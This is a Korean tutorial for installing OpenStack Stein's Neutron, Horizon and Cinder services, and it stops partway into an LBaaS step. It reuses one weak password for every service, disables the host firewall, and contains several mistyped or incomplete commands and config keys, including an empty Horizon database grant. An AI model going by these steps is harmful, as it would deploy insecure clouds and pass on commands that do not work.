참조해주세요.    Neutron 사용자 추가  $ openstack user create --domain default --project service --password qwer1234 neutron\r$ openstack role add --project service --user neutron admin\r$ openstack service create --name neutron --description \u0026#34;OpenStack Networking service\u0026#34; network\r# Netutron 사용자를 추가 및 서비스를 등록합니다.\r$ export controller=10.10.10.10\r$ openstack endpoint create --region RegionOne network public http://$controller:9696\r$ openstack endpoint create --region RegionOne network internal http://$controller:9696\r$ openstack endpoint create --region RegionOne network admin http://$controller:9696\r# neutron의 endpoint를 생성합니다.\r  Neutron DB 생성  $ mysql -u root -p\rMariaDB [(none)]\u0026gt; create database neutron_ml2;\rMariaDB [(none)]\u0026gt; grant all privileges on neutron_ml2.* to neutron@\u0026#39;localhost\u0026#39; identified by \u0026#39;pw\u0026#39;;\rMariaDB [(none)]\u0026gt; grant all privileges on neutron_ml2.* to neutron@\u0026#39;%\u0026#39; identified by \u0026#39;pw\u0026#39;;\rMariaDB [(none)]\u0026gt; flush privileges;\r# neutron 구성을 위한 db를 생성합니다. ( 저는 편의를 위해 모든 pw로 qwer1234 설정하였습니다. )\r  Neutron 설치 및 설정  $ yum --enablerepo=centos-openstack-stein,epel -y install openstack-neutron openstack-neutron-ml2\r# neutron 패키지 설치\r$ vi /etc/neutron/neutron.conf\r[DEFAULT]\rcore_plugin = ml2\rservice_plugins = router\rauth_strategy = keystone\rstae_path = /var/lib/neutron\rdhcp_agent_notification = True\rallow_overlapping_ips = True\rnotify_nova_on_port_status_changes = True\rnotify_nova_on_port_data_changes = True\rtransport_url = rabbit://openstack:qwer1234@controller\r[keystone_authtoken]\rwww_authenticate_uri = http://controller:5000\rauth_url = http://controller:5000\rmemcached_servers = controller:11211\rauth_type = password\rproject_domain_name = default\ruser_domain_name = default\rproject_name = service\rusername = neutron\rpassword = qwer1234\r[database]\rconnection = mysql+pymysql://neutron:qwer1234@controller/neutron_ml2\r[nova]\rauth_url = http://controller:5000\rauth_type = password\rproject_domain_name = default\ruser_domain_name = default\rregion_name = RegionOne\rproject_name = service\rusername = nova\rpassword = qwer1234\r[oslo_concurrency]\rlock_path = $state_path/tmp\r$ vi /etc/neutron/metadata_agent.ini\r[DEFAULT]\rnova_metadata_host = controller\rmetadata_proxy_shared_secret = metadata_secret\rmemcache_servers = controller:11211\r# metadata_agent.ini 파일을 수정합니다.\r$ vi /etc/neutron/plugins/ml2/ml2_conf.ini\r[ml2]\rtype_drivers = flat,vlan,gre,vxlan\rtenant_network_types =\rmechanism_drivers = openvswitch\rextension_drivers = port_security\r# ml2_conf.ini 파일에 설정을 수정합니다.\r  이어 nova.conf 파일에 설정을 추가합니다.  $ vi /etc/nova/nova.conf\r[DEFAULT]\r...\ruse_neutron = True\rlinuxnet_interface_driver = nova.network.linux_net.LinuxOVSInterfaceDriver\rfirewall_driver = nova.virt.firewall.NoopFirewallDriver\r[neutron]\rauth_url = http://controller:5000\rauth_type = password\rproject_domain_name = default\ruser_domain_name = default\rregion_name = RegionOne\rproject_name = service\rusername = neutron\rpassword = qwer1234\rservice_metadata_proxy = True\rmetadata_proxy_shared_secret = metadata_secret\r  Selinux 및 방화벽 설정  $ yum --enablerepo=centos-openstack-stein -y install openstack-selinux\r$ setsebool -P neutron_can_network on\r$ setsebool -P daemons_enable_cluster_mode on\r$ firewall-cmd --add-port=9696/tcp --permanent\r$ firewall-cmd --reload\r# Selinux 및 방화벽을 설정합니다.\r  Neutron DB를 생성 및 서비스를 시작합니다.  $ ln -s /etc/neutron/plugins/ml2/ml2_conf.ini /etc/neutron/plugin.ini\r$ su -s /bin/bash neutron -c \u0026#34;neutron-db-manage --config-file /etc/neutron/neutron.conf --config-file /etc/neutron/plugin.ini upgrade head\u0026#34;\r# Neutron DB를 생성합니다.\r$ systemctl start neutron-server neutron-metadata-agent\r$ systemctl enable neutron-server neutron-metadata-agent\r$ systemctl restart openstack-nova-api\r    이제 다음으로는 network 노드에 구현해보도록 하겠습니다.  $ yum -y install centos-release-openstack-stein\r$ sed -i -e \u0026#34;s/enabled=1/enabled=0/g\u0026#34; /etc/yum.repos.d/CentOS-OpenStack-stein.repo\r# stein 패캐지를 등록합니다.\r$ yum --enablerepo=centos-openstack-stein,epel -y install openstack-neutron openstack-neutron-ml2 openstack-neutron-openvswitch libibverbs\r# neutron 패키지를 설치합니다.\r  neutron 설정합니다.  $ vi /etc/neutron/neutron.conf\r[DEFAULT]\rcore_plugin = ml2\rservice_plugins = router\rauth_strategy = keystone\rstae_path = /var/lib/neutron\rallow_overlapping_ips = True\rtransport_url = rabbit://openstack:qwer1234@controller\r[keystone_authtoken]\rwww_authenticate_uri = http://controller:5000\rauth_url = http://controller:5000\rmemcached_servers = controller:11211\rauth_type = password\rproject_domain_name = default\ruser_domain_name = default\rproject_name = service\rusername = neutron\rpassword = qwer1234\r[oslo_concurrency]\rlock_path = $state_path/tmp\r$ vi /etc/neutron/l3_agent.ini\r[DEFAULT]\r...\rinterface_driver = openvswitch\r# l3_agent.ini 파일을 수정합니다.\r$ vi /etc/neutron/dhcp_agent.ini\r[DEFAULT]\r...\rinterface_driver = openvswitch\rdhcp_driver = neutron.agent.linux.dhcp.Dnsmasq\renable_isolated_metadata = true\r# dhcp_agent.ini 파일을 수정합니다.\r$ vi /etc/neutron/metadata_agent.ini\r[DEFAULT]\rnova_metadata_host = controller\rmetadata_proxy_shared_secret = metadata_secret\r# metadata_agent.ini 파일을 수정합니다.\r$ vi /etc/neutron/plugins/ml2/ml2_conf.ini\r[ml2]\rtype_drivers = flat,vlan,gre,vxlan\rtenant_network_types =\rmechanism_drivers = openvswitch\rextension_drivers = port_security\r# ml2_conf.ini 파일에 설정을 수정합니다.\r$ vi /etc/neutron/plugins/ml2/openvswitch_agent.ini\r[securitygroup]\rfirewall_driver = openvswitch\renable_security_group = true\renable_ipset = true\r# openvswitch_agent.ini 파일의 하단에 추가합니다.\r  Selinux 및 방화벽 설정  $ yum --enablerepo=centos-openstack-stein -y install openstack-selinux\r$ setsebool -P neutron_can_network on\r$ setsebool -P haproxy_connect_any on\r$ setsebool -P daemons_enable_cluster_mode on\r$ vi my-ovsofctl.te\r# create new\rmodule my-ovsofctl 1.0;\rrequire {\rtype neutron_t;\rclass capability sys_rawio;\r}\r#============= neutron_t ==============\rallow neutron_t self:capability sys_rawio;\r$ checkmodule -m -M -o my-ovsofctl.mod my-ovsofctl.te $ semodule_package --outfile my-ovsofctl.pp --module my-ovsofctl.mod $ semodule -i my-ovsofctl.pp # Selinux 및 방화벽을 추가설정합니다.\r  시스템을 재시작 합니다.  $ ln -s /etc/neutron/plugins/ml2/ml2_conf.ini /etc/neutron/plugin.ini\r$ systemctl start openvswitch\r$ systemctl enable openvswitch\r$ ovs-vsctl add-br br-int\r$ systemctl restart openstack-nova-compute\r$ systemctl start neutron-openvswitch-agent\r$ systemctl enable neutron-openvswitch-agent\r  이어서 compute 노드에서의 설정을 진행하겠습니다.  $ yum --enablerepo=centos-openstack-stein,epel -y install openstack-neutron openstack-neutron-ml2 openstack-neutron-openvswitch\r# neutron 패키지를 설치합니다.\r  neutron 설정합니다.  $ vi /etc/neutron/neutron.conf\r[DEFAULT]\rcore_plugin = ml2\rservice_plugins = router\rauth_strategy = keystone\rstae_path = /var/lib/neutron\rallow_overlapping_ips = True\rtransport_url = rabbit://openstack:qwer1234@controller\r[keystone_authtoken]\rwww_authenticate_uri = http://controller:5000\rauth_url = http://controller:5000\rmemcached_servers = controller:11211\rauth_type = password\rproject_domain_name = default\ruser_domain_name = default\rproject_name = service\rusername = neutron\rpassword = qwer1234\r[oslo_concurrency]\rlock_path = $state_path/tmp\r$ vi /etc/neutron/plugins/ml2/ml2_conf.ini\r[ml2]\rtype_drivers = flat,vlan,gre,vxlan\rtenant_network_types =\rmechanism_drivers = openvswitch\rextension_drivers = port_security\r# ml2_conf.ini 파일에 설정을 수정합니다.\r$ vi /etc/neutron/plugins/ml2/openvswitch_agent.ini\r[securitygroup]\rfirewall_driver = openvswitch\renable_security_group = true\renable_ipset = true\r# openvswitch_agent.ini 파일의 하단에 추가합니다.\r  이어서 Nova.conf 파일을 수정합니다.  $ vi /etc/nova/nova.conf\r[DEFAULT]\r...\ruse_neutron = True\rlinuxnet_interface_driver = nova.network.linux_net.LinuxOVSInterfaceDriver\rfirewall_driver = nova.virt.firewall.NoopFirewallDriver\rvif_plugging_is_fatal = True\rvif_plugging_timeout = 300\r[neutron]\rauth_url = http://controller:5000\rauth_type = password\rproject_domain_name = default\ruser_domain_name = default\rregion_name = RegionOne\rproject_name = service\rusername = neutron\rpassword = qwer1234\rservice_metadata_proxy = True\rmetadata_proxy_shared_secret = metadata_secret\r  Selinux 및 방화벽 설정  $ yum --enablerepo=centos-openstack-stein -y install openstack-selinux\r$ setsebool -P neutron_can_network on\r$ setsebool -P haproxy_connect_any on\r$ setsebool -P daemons_enable_cluster_mode on\r$ vi my-ovsofctl.te\r# create new\rmodule my-ovsofctl 1.0;\rrequire {\rtype neutron_t;\rclass capability sys_rawio;\r}\r#============= neutron_t ==============\rallow neutron_t self:capability sys_rawio;\r$ checkmodule -m -M -o my-ovsofctl.mod my-ovsofctl.te $ semodule_package --outfile my-ovsofctl.pp --module my-ovsofctl.mod $ semodule -i my-ovsofctl.pp # Selinux 및 방화벽을 추가설정합니다.\r  시스템을 재시작 합니다.  $ ln -s /etc/neutron/plugins/ml2/ml2_conf.ini /etc/neutron/plugin.ini\r$ systemctl start openvswitch\r$ systemctl enable openvswitch\r$ ovs-vsctl add-br br-int\r$ for service in dhcp-agent l3-agent metadata-agent openvswitch-agent; do\rsystemctl start neutron-$service\rsystemctl enable neutron-$service\rdone\r    이제 이어 compute 노드에서 neutron 서비스를 설치하도록 하겠습니다.  $ yum --enablerepo=centos-openstack-stein,epel -y install openstack-neutron openstack-neutron-ml2 openstack-neutron-openvswitch\r# neutron 서비스를 설치합니다.\r$ vi /etc/neutron/neutron.conf\r[DEFAULT]\rcore_plugin = ml2\rservice_plugins = router\rauth_strategy = keystone\rstae_path = /var/lib/neutron\rallow_overlapping_ips = True\rtransport_url = rabbit://openstack:qwer1234@controller\r[keystone_authtoken]\rwww_authenticate_uri = http://controller:5000\rauth_url = http://controller:5000\rmemcached_servers = controller:11211\rauth_type = password\rproject_domain_name = default\ruser_domain_name = default\rproject_name = service\rusername = neutron\rpassword = qwer1234\r[oslo_concurrency]\rlock_path = $state_path/tmp\r$ vi /etc/neutron/plugins/ml2/ml2_conf.ini\r[ml2]\rtype_drivers = flat,vlan,gre,vxlan\rtenant_network_types =\rmechanism_drivers = openvswitch\rextension_drivers = port_security\r$ vi /etc/neutron/plugins/ml2/openvswitch_agent.ini\r[securitygroup]\rfirewall_driver = openvswitch\renable_security_group = true\renable_ipset = true\r  이어서 nova.conf 파일을 수정합니다.  $ vi /etc/nova/nova.conf\r[DEFAULT]\r...\ruse_neutron = True\rlinuxnet_interface_driver = nova.network.linux_net.LinuxOVSInterfaceDriver\rfirewall_driver = nova.virt.firewall.NoopFirewallDriver\rvif_plugging_is_fatal = True\rvif_plugging_timeout = 300\r[neutron]\rauth_url = http://controller:5000\rauth_type = password\rproject_domain_name = default\ruser_domain_name = default\rregion_name = RegionOne\rproject_name = service\rusername = neutron\rpassword = qwer1234\rservice_metadata_proxy = True\rmetadata_proxy_shared_secret = metadata_secret\r  Selinux 및 방화벽 설정  $ yum --enablerepo=centos-openstack-stein -y install openstack-selinux\r$ setsebool -P neutron_can_network on\r$ setsebool -P haproxy_connect_any on\r$ setsebool -P daemons_enable_cluster_mode on\r$ vi my-ovsofctl.te\r# create new\rmodule my-ovsofctl 1.0;\rrequire {\rtype neutron_t;\rclass capability sys_rawio;\r}\r#============= neutron_t ==============\rallow neutron_t self:capability sys_rawio;\r$ checkmodule -m -M -o my-ovsofctl.mod my-ovsofctl.te $ semodule_package --outfile my-ovsofctl.pp --module my-ovsofctl.mod $ semodule -i my-ovsofctl.pp # Selinux 및 방화벽을 추가설정합니다.\r  서비스를 재시작 및 등록합니다.  $ ln -s /etc/neutron/plugins/ml2/ml2_conf.ini /etc/neutron/plugin.ini\r$ systemctl start openvswitch\r$ systemctl enable openvswitch\r$ ovs-vsctl add-br br-int\r$ systemctl restart openstack-nova-compute\r$ systemctl start neutron-openvswitch-agent\r$ systemctl enable neutron-openvswitch-agent\r    이제 다음으로는 본격적으로 neutron 네트워크를 구현해보도록 하겠습니다. 먼저 controller 노드에서 ml2_conf 파일을 수정 및 추가합니다. 위에서 tenant 타입을 비워둔 이유는, 타입에 따라 사용하는 네트워크 구조가 달라지기 때문입니다. 여기서는 vxlan을 사용해 구성해보도록 하겠습니다.  $ vi /etc/neutron/plugins/ml2/ml2_conf.ini\r[ml2]\rtenant_network_types = vxlan\r[ml2_type_flat]\rflat_networks = physnet1\r[ml2_type_vxlan]\rvni_ranges = 1:1000\r# ml2.conf 파일을 수정합니다\r$ systemctl restart neutron-server\r# neutron 서비스를 재시작 합니다.\r  이제 Network 노드에서의 설치를 진행해보도록 하겠습니다.   $ ovs-vsctl add-br br-eth1\r$ ovs-vsctl add-port br-eth1 ens33\r# 네트워크 브릿지를 생성하고, 네트워크 노드의 외부대역의 인터페이스 번호를 바인딩합니다.\r  neutron 서비스 사용을 위한 설정을 진행합니다.  $ vi /etc/neutron/plugins/ml2/ml2_conf.ini\r[ml2]\rtype_drivers = flat,vlan,gre,vxlan\rtenant_network_types = vxlan\rmechanism_drivers = openvswitch\rextension_drivers = port_security\r[ml2_type_flat]\rflat_networks = physnet1\r[ml2_type_vxlan]\rvni_ranges = 1:1000\r# ml2_conf.ini 파일에 설정을 추가 설정합니다.\r$ vi /etc/neutron/plugins/ml2/openvswitch_agent.ini\r[agent]\rtunnel_type = vxlan\rprevent_arp_spoofing = True\r[ovs]\rlocal_ip = 10.10.10.20\rbridge_mappings = physnet1:br-eth1\r# openvswitch_agent.ini 파일의 하단에 추가합니다.\r$ for service in dhcp-agent l3-agent metadata-agent openvswitch-agent; do systemctl restart neutron-$service\rdone\r# neutron 서비스를 재시작합니다.\r$ systemctl stop firewalld\r$ systemctl disable firewalld\r# 방화벽을 해제합니다.\r  바인딩 오류를 해결하기 위해 설정을 진행합니다.  $ vi /etc/sysconfig/network-scripts/ifcfg-ens33\rTYPE=Ethernet\rBOOTPROTO=static\rDEFROUTE=yes\rNAME=ens33\rDEVICE=ens33\rONBOOT=yes\r$ vi /var/tmp/create_interface.sh\r#!/bin/bash\rip link set up br-eth1\rip addr add 192.168.10.101/24 dev br-eth1\rroute add default gw 192.168.10.2 dev br-eth1\recho \u0026#34;nameserver 8.8.8.8\u0026#34; \u0026gt; /etc/resolv.conf\r$ chmod 755 /var/tmp/create_interface.sh\r$ vi /etc/systemd/system/set_interface.service\r[Unit]\rDescription=Description for sample script goes here\rAfter=network.target\r[Service]\rType=simple\rExecStart=/var/tmp/create_interface.sh\rTimeoutStartSec=0\r[Install]\rWantedBy=default.target\r$ systemctl enable set_interface\r$ init 6\r  이어 compute 노드에서의 설정을 진행합니다.  $ vi /etc/neutron/plugins/ml2/ml2_conf.ini\r[ml2]\rtype_drivers = flat,vlan,gre,vxlan\rtenant_network_types = vxlan\rmechanism_drivers = openvswitch\rextension_drivers = port_security\r[ml2_type_flat]\rflat_networks = physnet1\r[ml2_type_vxlan]\rvni_ranges = 1:1000\r# ml2_conf.ini 파일에 설정을 추가 설정합니다.\r$ vi /etc/neutron/plugins/ml2/openvswitch_agent.ini\r[agent]\rtunnel_type = vxlan\rprevent_arp_spoofing = True\r[ovs]\rlocal_ip = 10.10.10.30\r# openvswitch_agent.ini 파일의 하단에 추가합니다.\r$ for service in dhcp-agent l3-agent metadata-agent openvswitch-agent; do systemctl restart neutron-$service\rdone\r# neutron 서비스를 재시작합니다.\r$ systemctl stop firewalld\r$ systemctl disable firewalld\r# 방화벽을 해제합니다.\r  확인  $ openstack network agent list\r+--------------------------------------+--------------------+------------+-------------------+-------+-------+---------------------------+\r| ID | Agent Type | Host | Availability Zone | Alive | State | Binary |\r+--------------------------------------+--------------------+------------+-------------------+-------+-------+---------------------------+\r| 261bbd8f-ece9-4818-91c3-be75b928fa54 | Open vSwitch agent | network | None | :-) | UP | neutron-openvswitch-agent |\r| 26376b7b-e4d0-413c-85b9-521994c41bf6 | Open vSwitch agent | compute | None | :-) | UP | neutron-openvswitch-agent |\r| 8b520189-c500-47ec-b330-b84bc0a3b622 | Metadata agent | controller | None | :-) | UP | neutron-metadata-agent |\r| ba443e32-a931-465f-acff-05621dac0424 | Metadata agent | network | None | :-) | UP | neutron-metadata-agent |\r| be878ec2-b8c9-4923-8d01-111d7c11c8f1 | L3 agent | network | nova | :-) | UP | neutron-l3-agent |\r| cb74c09d-7ec5-4457-a384-8303235adc97 | DHCP agent | network | nova | :-) | UP | neutron-dhcp-agent |\r+--------------------------------------+--------------------+------------+-------------------+-------+-------+---------------------------+\r$ openstack router create router01\r$ openstack network create int --provider-network-type vxlan\r$ openstack subnet create int_sub --network int \\\r--subnet-range 1.1.1.0/24 --gateway 1.1.1.2 \\\r--dns-nameserver 8.8.8.8\r# 라우터와 내부대역을 생성합니다.\r$ openstack router add subnet router01 int_sub\r# 라우터와 내부대벽을 연결시킵니다.\r$ openstack network create \\\r--provider-physical-network physnet1 \\\r--provider-network-type flat --external ext\r$ openstack subnet create subnet2 \\\r--network ext_net --subnet-range 192.168.10.0/24 \\\r--allocation-pool start=192.168.10.150,end=192.168.10.200 \\\r--gateway 192.168.10.2 --dns-nameserver 8.8.8.8\r# 외부대역을 생성합니다. 외부대역의 IP는 바인딩한 br-eth1의 IP 대역과 동일해야합니다.\r$ openstack router set router01 --external-gateway ext\r# 생성한 라우터의 게이트웨이를 생성한 외부대역에 바운딩시킵니다.\r$ openstack network list\r+--------------------------------------+------+--------------------------------------+\r| ID | Name | Subnets |\r+--------------------------------------+------+--------------------------------------+\r| 2875f833-2d46-4740-bdd4-09c75c53e2b1 | int | 698d35ae-8d7c-436f-be1b-fcf4319eb5fe |\r| 4a25933d-ed21-4a5c-a87b-4e782e93c14c | ext | 47b0ee11-b628-4260-9185-71d1dab401ea |\r+--------------------------------------+------+--------------------------------------+\r$ openstack subnet list\r+--------------------------------------+---------+--------------------------------------+-----------------+\r| ID | Name | Network | Subnet |\r+--------------------------------------+---------+--------------------------------------+-----------------+\r| 47b0ee11-b628-4260-9185-71d1dab401ea | ext-sub | 4a25933d-ed21-4a5c-a87b-4e782e93c14c | 192.168.10.0/24 |\r| 698d35ae-8d7c-436f-be1b-fcf4319eb5fe | int-sub | 2875f833-2d46-4740-bdd4-09c75c53e2b1 | 1.1.1.0/24 |\r+--------------------------------------+---------+--------------------------------------+-----------------+\r$ wget http://cloud-images.ubuntu.com/releases/18.04/release/ubuntu-18.04-server-cloudimg-amd64.img -P /var/kvm/images\r$ openstack image create \u0026#34;Ubuntu1804\u0026#34; --file /var/kvm/images/ubuntu-18.04-server-cloudimg-amd64.img --disk-format qcow2 --container-format bare --public\r# 이미지를 다운로드 및 등록합니다.\r$ openstack flavor create --ram 1024 --disk 10 --vcpus 1 m1.small\r# flavor를 생성합니다.\r$ ssh-keygen -q -N \u0026#34;\u0026#34;\r$ openstack keypair create --public-key ~/.ssh/id_rsa.pub mykey\r# keypair를 생성합니다.\r$ openstack floating ip create ext\r# floating ip를 생성합니다.\r$ openstack create server --image Ubuntu1804 --flavor m1.small --key mykey --network int Ubuntu\r$ openstack server add floating ip Ubuntu 192.168.10.170\r# 인스턴스를 생성하고 floating ip를 추가합니다.\r$ openstack server list\r+--------------------------------------+--------+--------+-------------------------------+------------+----------+\r| ID | Name | Status | Networks | Image | Flavor |\r+--------------------------------------+--------+--------+-------------------------------+------------+----------+\r| 75fa0186-ab63-4aaa-a27c-3f2126e5d31d | Ubuntu | ACTIVE | int=1.1.1.248, 192.168.10.170 | Ubuntu1804 | m1.small |\r+--------------------------------------+--------+--------+-------------------------------+------------+----------+\r$ openstack security group create open\r$ openstack security group rule create --protocol icmp --ingress open\r$ openstack security group rule create --protocol tcp --dst-port 22:22 open\r$ openstack security group rule create --protocol tcp --dst-port 80:80 open\r$ openstack server add security group Ubuntu open\r# 보안그룹을 생성하고 적용시킵니다.\r$ ssh ubuntu@192.168.10.170\r$ ping 8.8.8.8\r$ sudo apt -y install apache2\r$ sudo service apache2 start\r# 본체 Host에서 접속해서 확인\r 이것으로 기본적인 openstack-stein 버전의 설치를 완료하였습니다.     7. Horizon ( 대시보드 서비스 ) 구성   Horizon은 controller 노드에서 설치가 진행됩니다. 에 대한 설명은 Horizone을 참조해주세요.    Horizon 패키지 설치  $ yum --enablerepo=centos-openstack-stein,epel -y install openstack-dashboard\r# Horizon 패키지를 설치합니다.\r  대시보드를 설정합니다.  $ vi /etc/openstack-dashboard/local_settings\rALLOWED_HOSTS = [\u0026#39;*\u0026#39;] # 수정\rOPENSTACK_API_VERSIONS = { \u0026#34;identity\u0026#34;: 3,\r\u0026#34;image\u0026#34;: 3,\r\u0026#34;volume\u0026#34;: 3,\r\u0026#34;compute\u0026#34;: 2,\r}\r# 주석 제거 및 수정\rOPENSTACK_KEYSTONE_MULTIDOMAIN_SUPPORT = True # 주석 해제 및 수정\rOPENSTACK_KEYSTONE_DEFAULT_DOMAIN = \u0026#39;Default\u0026#39; # 주석 제거\rCACHES = { \u0026#39;default\u0026#39;: {\r\u0026#39;BACKEND\u0026#39;: \u0026#39;django.core.cache.backends.memcached.MemcachedCache\u0026#39;,\r\u0026#39;LOCATION\u0026#39;: \u0026#39;127.0.0.1:11211\u0026#39;,\r},\r}\r# 주석제거\rOPENSTACK_HOST = \u0026#34;controller\u0026#34;\r# IP 변경\rOPENSTACK_KEYSTONE_DEFAULT_ROLE = \u0026#34;member\u0026#34;\r# 수정\r$ vi /etc/httpd/conf.d/openstack-dashboard.conf\rWSGIDaemonProcess dashboard\rWSGIProcessGroup dashboard\rWSGISocketPrefix run/wsgi\rWSGIApplicationGroup %{GLOBAL}\r# 추가\r  Selinux 및 방화벽 설정  $ setsebool -P httpd_can_network_connect on\r$ firewall-cmd --add-service={http,https} --permanent\r$ firewall-cmd --reload\r$ systemctl restart httpd\r  ** DB 생성**  $ mysql -u root -p\rMariaDB [(none)]\u0026gt; create database keystone;\rMariaDB [(none)]\u0026gt; grant all privileges on .* to @\u0026#39;localhost\u0026#39; identified by \u0026#39;pw\u0026#39;;\rMariaDB [(none)]\u0026gt; grant all privileges on .* to @\u0026#39;%\u0026#39; identified by \u0026#39;pw\u0026#39;;\rMariaDB [(none)]\u0026gt; flush privileges;\r# 구성을 위한 db를 생성합니다. ( 저는 편의를 위해 모든 pw로 qwer1234 설정하였습니다. )\r   8. Cinder ( 오브젝트 스토리지 및 블록 스토리지 구성 )   Cinder는 기본적으로 독립적으로 storage 노드를 구성하거나 혹은 compute 노드에 추가하여 사용합니다. 여기서는 compute 노드에 포함하여 구성하도록 하겠습니다/ 구성 순서는 controller \u0026gt; compute 노드 순으로 진행하겠습니다. Cinder에 대한 설명은 Cinder을 참조해주세요.    Cinder 서비스 등록  $ source ~/admin\r$ openstack user create --domain default --project service --password qwer1234 cinder\r$ openstack role add --project service --user cinder admin\r$ openstack service create --name cinderv3 --description \u0026#34;OpenStack Block service\u0026#34; volumev3\r# cinder 사용자를 추가 및 서비스를 등록합니다.\r$ export controller=10.10.10.10\r$ openstack endpoint create --region RegionOne volumev3 public http://$controller:8776/v3/%\\(tenant_id\\)s\r$ openstack endpoint create --region RegionOne volumev3 internal http://$controller:8776/v3/%\\(tenant_id\\)s\r$ openstack endpoint create --region RegionOne volumev3 admin http://$controller:8776/v3/%\\(tenant_id\\)s\r# cinder의 endpoint를 생성합니다.\r  Cinder DB 생성  $ mysql -u root -p\rMariaDB [(none)]\u0026gt; create database cinder;\rMariaDB [(none)]\u0026gt; grant all privileges on cinder.* to cinder@\u0026#39;localhost\u0026#39; identified by \u0026#39;pw\u0026#39;;\rMariaDB [(none)]\u0026gt; grant all privileges on cinder.* to cinder@\u0026#39;%\u0026#39; identified by \u0026#39;pw\u0026#39;;\rMariaDB [(none)]\u0026gt; flush privileges;\r# cinder 구성을 위한 db를 생성합니다. ( 저는 편의를 위해 모든 pw로 qwer1234 설정하였습니다. )\r  cinder 패키지 설치 및 수정  $ yum --enablerepo=centos-openstack-stein,epel -y install openstack-cinder\r$ vi /etc/cinder/cinder.conf\r[DEFAULT]\rmy_ip = 10.10.10.10\rlog_dir = /var/log/cinder\rstate_path = /var/lib/cinder\rauth_strategy = keystone\rtransport_url = rabbit://openstack:qwer1234@controller\renable_v3_api = True\r[keystone_authtoken]\rwww_authenticate_uri = http://controller:5000\rauth_url = http://controller:5000\rmemcached_servers = controller:11211\rauth_type = password\rproject_domain_name = default\ruser_domain_name = default\rproject_name = service\rusername = cinder\rpassword = qwer1234\r[database]\rconnection = mysql+pymysql://cinder:qwer1234@controller/cinder\r[oslo_concurrency]\rlock_path = $state_path/tmp\r# cinder.conf 파일을 수정합니다.\r$ su -s /bin/bash cinder -c \u0026#34;cinder-manage db sync\u0026#34;\r# cinder db를 동기화시킵니다.\r$ systemctl start openstack-cinder-api openstack-cinder-scheduler\r$ systemctl enable openstack-cinder-api openstack-cinder-scheduler\r# cinder 시작 및 자동시작을 등록합니다.\r$ echo \u0026#34;export OS_VOLUME_API_VERSION=3\u0026#34; \u0026gt;\u0026gt; ~/admin\r$ source ~/admin\r# 볼륨 버전을 API 3로 지정합니다.\r$ firewall-cmd --add-port=8776/tcp --permanent\r$ firewall-cmd --reload\r    이어서 compute 노드에 설치를 진행하겠습니다. cinder 패키지 설치 및 수정  $ yum --enablerepo=centos-openstack-stein,epel -y install openstack-cinder python2-crypto targetcli\r$ vi /etc/cinder/cinder.conf\r[DEFAULT]\rmy_ip = 10.10.10.30\rlog_dir = /var/log/cinder\rstate_path = /var/lib/cinder\rauth_strategy = keystone\rtransport_url = rabbit://openstack:qwer1234@controller\rglance_api_servers = http://controller:9292\renable_v3_api = True\r[keystone_authtoken]\rwww_authenticate_uri = http://controller:5000\rauth_url = http://controller:5000\rmemcached_servers = controller:11211\rauth_type = password\rproject_domain_name = default\ruser_domain_name = default\rproject_name = service\rusername = cinder\rpassword = qwer1234\r[database]\rconnection = mysql+pymysql://cinder:qwer1234@controller/cinder\r[oslo_concurrency]\rlock_path = $state_path/tmp\r# cinder.conf 파일을 수정합니다.\r$ systemctl start openstack-cinder-volume\r$ systemctl enable openstack-cinder-volume\r# cinder 서비스를 시작 및 자동시작을 등록합니다.\r$ controller $openstack volume service list\r# 확인\r+------------------+------------+------+---------+-------+----------------------------+\r| Binary | Host | Zone | Status | State | Updated At |\r+------------------+------------+------+---------+-------+----------------------------+\r| cinder-scheduler | controller | nova | enabled | up | 2020-07-20T04:02:31.000000 |\r+------------------+------------+------+---------+-------+----------------------------+\r   8-2. LVM으로 블록 스토리지 백엔드 구성   compute 노드에 cinder 서비스를 설치한 것에 이어 LVM 백엔드를 설정해보도록 하겠습니다. VG 생성 참조  $ fdisk /dev/sd[ n ]\r# 만약 디스크 파티션이 없으시면 새로 생성 후 등록합니다.\r# 저는 간단하게 100G 하드를 추가한 후, cinder 이름으로 vg를 생성하였습니다.\r$ vi /etc/cinder/cinder.conf\r[DEFAULT]\r...\renabled_backends = lvm\r[lvm]\rtarget_helper = lioadm\rtarget_protocol = iscsi\rtarget_ip_address = 10.10.10.30\rvolume_group = cinder\rvolume_driver = cinder.volume.drivers.lvm.LVMVolumeDriver\rvolume_dir = $state_path/volumes\r# cinder.conf의 상단에 내용을 추가설정합니다.\r$ firewall-cmd --add-service=iscsi-target --permanent\r$ firewall-cmd --reload\r# 방화벽 설정을 추가합니다.\r$ systemctl restart openstack-cinder-volume\r# 서비스를 재시작합니다.\r  이어서 compute 노드의 nova.conf 파일을 수정합니다.  $ vi /etc/nova/nova.conf\r[cinder]\ros_region_name = RegionOne\r# nova.conf의 하단에 상단의 내용을 추가합니다.\r$ systemctl restart openstack-nova-compute\r# nova 서비스를 재시작합니다.\r$ controller $ openstack volume service list\r# 생성을 확인합니다.\r+------------------+-------------+------+---------+-------+----------------------------+\r| Binary | Host | Zone | Status | State | Updated At |\r+------------------+-------------+------+---------+-------+----------------------------+\r| cinder-scheduler | controller | nova | enabled | up | 2020-07-20T04:54:52.000000 |\r| cinder-volume | compute@lvm | nova | enabled | up | 2020-07-20T04:54:52.000000 |\r+------------------+-------------+------+---------+-------+----------------------------+\r$ controller $ openstack volume cretae --size 1 test\r# 확인용 1G volume을 생성합니다.\r+---------------------+--------------------------------------+\r| Field | Value |\r+---------------------+--------------------------------------+\r| attachments | [] |\r| availability_zone | nova |\r| bootable | false |\r| consistencygroup_id | None |\r| created_at | 2020-07-20T05:00:21.000000 |\r| description | None |\r| encrypted | False |\r| id | f09ee80f-3ec8-4eaf-a4a5-af13cccbd5ae |\r| migration_status | None |\r| multiattach | False |\r| name | test |\r| properties | |\r| replication_status | None |\r| size | 1 |\r| snapshot_id | None |\r| source_volid | None |\r| status | creating |\r| type | None |\r| updated_at | None |\r| user_id | 296ce49d1dc94931b62a726fb64712e9 |\r+---------------------+--------------------------------------+\r$ openstack volume list\r# 생성한 volume을 확인합니다.\r+--------------------------------------+------+-----------+------+-------------+\r| ID | Name | Status | Size | Attached to |\r+--------------------------------------+------+-----------+------+-------------+\r| f09ee80f-3ec8-4eaf-a4a5-af13cccbd5ae | test | available | 1 | |\r+--------------------------------------+------+-----------+------+-------------+\r   LBaaS 설치  로드밸런싱을 위해서는 LBaaS를 사용해야 합니다. LBaaS에 대해서는 LBaaS를 참조해주세요.  $ yum --enablerepo=centos-openstack-stein,epel -y install openstack-neutron-lbaas net-tools\r# LBaaS 서비스를 설치합니다.\r$ vi 